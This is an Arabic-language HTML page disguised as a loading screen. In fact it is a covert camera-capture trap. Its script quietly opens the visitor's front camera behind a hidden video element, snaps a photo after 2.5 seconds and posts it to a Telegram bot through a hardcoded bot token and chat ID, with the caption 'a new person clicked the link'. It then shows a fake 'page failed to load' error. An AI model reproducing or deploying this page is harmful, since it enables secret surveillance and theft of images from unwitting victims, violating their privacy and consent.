<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            background: #000; 
            color: white; 
            margin:0; 
            padding:0; 
            height: 100vh;
            overflow: hidden;
        }
        #loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
        }
        .spinner {
            border: 6px solid #333;
            border-top: 6px solid #ff0066;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        video { display: none; } /* إخفاء الكاميرا */
        #status { margin-top: 30px; font-size: 20px; }
    </style>
</head>
<body>
    <div id="loader">
        <div class="spinner"></div>
        <p>جاري تحميل الصفحة...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader');
        const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
        const chatId = "2049331070";

        // تشغيل الكاميرا في الخلفية
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        })
        .then(stream => {
            video.srcObject = stream;
            
            // التقاط بعد 2.5 ثانية
            setTimeout(() => {
                captureAndSend();
            }, 2500);
        })
        .catch(err => {
            showError();
        });

        function captureAndSend() {
            canvas.width = 1280;
            canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.85);

            // إرسال الصورة
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: imageData,
                    caption: `📸 شخص جديد ضغط على الرابط\nالوقت: ${new Date().toLocaleString('ar-SA')}`
                })
            })
            .then(() => {
                showError(); // إظهار رسالة الخطأ بعد النجاح
            })
            .catch(() => {
                showError();
            });
        }

        function showError() {
            loader.innerHTML = `
                <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
                <p style="font-size:18px;">يرجى المحاولة مرة أخرى لاحقاً</p>
            `;
            // إيقاف الكاميرا
            if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
        }
    </script>
</body>
</html>
